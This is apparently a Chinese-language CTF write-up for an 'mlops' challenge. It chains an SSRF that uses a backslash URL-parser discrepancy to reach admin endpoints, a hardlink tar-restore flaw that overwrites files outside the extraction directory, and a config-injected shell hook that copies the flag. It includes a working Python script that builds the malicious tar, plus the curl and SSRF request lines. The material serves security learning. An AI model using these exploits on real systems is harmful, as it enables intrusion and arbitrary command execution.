---
title: mlops - URL解析差异SSRF + hardlink恢复缺陷 + 配置文件注入
date: 2026-08-30 23:30:00
categories:
  - CTF wp
tags:
  - CTF
  - SSRF
  - hardlink
description: mlops - URL解析差异SSRF + hardlink恢复缺陷 + 配置文件注入
---

#### 看源码，找api
/api/health 状态

/api/import  url参数上传host, 只允许 `http/https`并有 allowed.com  限制，还有2次DNS检查（第一次： 看这个域名当前解析到哪些 IP  ，第二次： 50ms 后再解析一次同一个域名与第一次对比）

/api/upload file参数文件上传， 生成一个 12 位随机 `file_id`，保存成 `/app/uploads/<file_id>.tar`，并返回file_id

/admin/backup/restore  根据 `file_id`把文件解压修复，需要admin权限，解压时还要检查tar不能存在python可执行物

/admin/runner/start 管理员会生成一个dataset映射生成一个/data/imports/<name>.csv文件，后台执行worker.py会读取这个表格

FLAG_PATH = Path("/flag")

#### 整体的代码逻辑
/api/import  url参数上传host, 只允许 `http/https`并有限制 allowed.com  ，还有2次DNS检查

```plain
if parsed.host != ALLOWED_HOST: # 必须恰好等于 "allowed.com" 
    return 403
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-001.png)

用户通过/api/upload上传tar压缩包，tar被存到/app/uploads/<file_id>.tar

管理员调用`/admin/backup/restore`检验tar后解压恢复到`/tmp/restore`

管理员调动`/admin/runner/start`执行任务， worker 读取 `/data/imports/<dataset>.csv`并生成报告

#### 漏洞点：
+ `url` 可控，是一个 **SSRF 入口面，**2次DNS检查->**DNS重绑定**
+ 上传的 `tar` 可控，是一个 **文件恢复/解包攻击面**
+ `admin` 接口的来源校验很弱，是一个 **权限边界面**
+ `worker.py` 里有 `shell=True` 的 hook，是一个 **最终执行面**

#### 攻击思路：
+ 绕过url检测
+ 用 SSRF 打 admin 接口
+ 上传恶意 tar 包
+ 调用 restore 解压写文件
+ 调用 runner 触发执行
+ 拿 flag

##### 1. URL 解析差异  ssrf
因为检查那是url必须等于allowed.com，但是allowed.com不可控

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-002.png)

URL：`http://allowed.com\@127.0.0.1：8000/`

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-003.png)

| **解析器** | **认为的 host** | **结果** |
| :--- | :--- | :--- |
| **urllib3**（检查用） | `allowed.com` | ✅ 通过检查 |
| **httpx**（实际请求用） | `127.0.0.1` | 🎯 打内网 |


**原理**：

+ urllib3 把 `allowed.com\@127.0.0.1` 当成一整个 host 字符串
+ httpx 把反斜杠 `\` 当成分隔符，认为 `@` 后面的 `127.0.0.1` 才是真正的 host

##### 2.上传恶意tar
怎么上传：通过/api/upload/接口

上传什么：



因为worker要读取 `/data/imports/<dataset>.csv`才能生成报告，所以我们就要先写一个合法的.csv文件， worker 启动时默认读的是/data/imports/latest.csv

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-004.png)

ok,有了合法的csv的文件之后，worker.py文件可以执行了，然后在worker.py文件里，worker 会读 `model-registry.json`，从里面找当前baseline-logistic-regression模型对应的配置，看配置里有没有 `warmup`，所以如果我们把它改成：

```plain
{
  "baseline-logistic-regression": {
    "family": "linear",
    "warmup": "cp /flag /app/static/reports/pwn.txt"
  }
}
```

那么 worker 启动这个模型时，就会执行这条命令

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-005.png)

补充一下为什么可以代码执行：

我们通过恢复逻辑覆盖了 worker 会读取的 model-registry.json，从而控制了 warmup hook 的内容；

而 warmup hook 最终被 subprocess.run(..., shell=True) 执行，因此形成命令执行。



这里还用到了一个： hardlink 恢复缺陷 

因为在tar里构造`name = pivot-reg`但是`type = hardlink``linkname = /app/static/model-registry.json`，程序会觉得：“我要解压的是 `/tmp/restore/pivot-reg`，没出界”

但实际上这个 `pivot-reg` 已经连到了：/app/static/model-registry.json。

所以后面你再放一个**同名普通文件**`pivot-reg`，解压器会往 `/tmp/restore/pivot-reg` 写内容，而这个路径已经通过 hardlink 连到外部目标，所以最后被改写的是：/app/static/model-registry.json



总之：构造一个合法的csv文件，然后覆盖model-registry.json文件，改baseline-logistic-regression模型对应的配置改成把flag内容复制到输出的报告的路径下的任意文件

> 核心思路是两组成员，名字都相同：
>
> 1. 一个 `hardlink` 成员
>     - 名字比如 `pivot-reg`
>     - `linkname` 指向外部目标，例如 `/app/static/model-registry.json`
> 2. 一个同名普通文件 `pivot-reg`
>     - 内容就是你想写进 `/app/static/model-registry.json` 的 JSON
>
> 如果还要同时造数据集，再来一组：
>
> 1. `pivot-csv` -> hardlink 到 `/data/imports/latest.csv`
> 2. 同名普通文件 `pivot-csv`
>     - 内容是合法 CSV
>

```plain
import io
import json
import tarfile


def add_hardlink_then_file(tar: tarfile.TarFile, name: str, target: str, data: bytes) -> None:
    # 中文注释：先添加一个硬链接成员，名字在恢复目录内，目标指向外部文件，就是/app/static/model-registry.json
    link = tarfile.TarInfo(name)
    link.type = tarfile.LNKTYPE
    link.linkname = target
    tar.addfile(link)

    # 中文注释：再添加一个同名普通文件，解压时会通过硬链接覆盖外部目标内容
    reg = tarfile.TarInfo(name)
    reg.size = len(data)
    tar.addfile(reg, io.BytesIO(data))


def build_evil_tar(output_path: str) -> None:
    # 中文注释：这里写你希望 worker 读取到的模型注册表内容
    model_registry = {
        "baseline-logistic-regression": {
            "family": "linear",
            "warmup": "cp /flag /app/static/reports/pwn.txt"
        }
    }
    model_registry_bytes = json.dumps(model_registry).encode("utf-8")

    # 中文注释：这里写一个最小合法 CSV，供 worker 读取 latest.csv
    csv_bytes = b"f1,label\n1,1\n2,0\n"

    with tarfile.open(output_path, "w") as tar:
        # 中文注释：覆盖模型注册表
        add_hardlink_then_file(
            tar,
            name="pivot-reg",
            target="/app/static/model-registry.json",
            data=model_registry_bytes,
        )

        # 中文注释：覆盖数据集文件
        add_hardlink_then_file(
            tar,
            name="pivot-csv",
            target="/data/imports/latest.csv",
            data=csv_bytes,
        )


if __name__ == "__main__":
    # 中文注释：生成最终要上传的恶意 tar
    build_evil_tar("evil.tar")
```

上传方法：****

```plain
cd /d C:\Users\HP\Desktop
curl -X POST "http://127.0.0.1:8000/api/upload" -F "file=@evil.tar"
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-006.png)

"file_id":"6bdd27fb5fb8"

##### 3.调用 restore 解压写文件（利用admin的api解压上车的恶意tar）
```plain
http://localhost:8000/api/import?url=http://allowed.com\@127.0.0.1:8000/admin/backup/restore?file_id=6bdd27fb5fb8
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-007.png)

##### 4.调用 runner 触发执行(运行解压的文件）
```plain
http://localhost:8000/api/import?url=http://allowed.com\@127.0.0.1:8000/admin/runner/start
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-008.png)

##### 5.拿 flag（访问输出的报告目录下的转载flag文件）
```plain
/static/reports/pwn.txt
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-mlops-ssrf-hardlink-009.png)



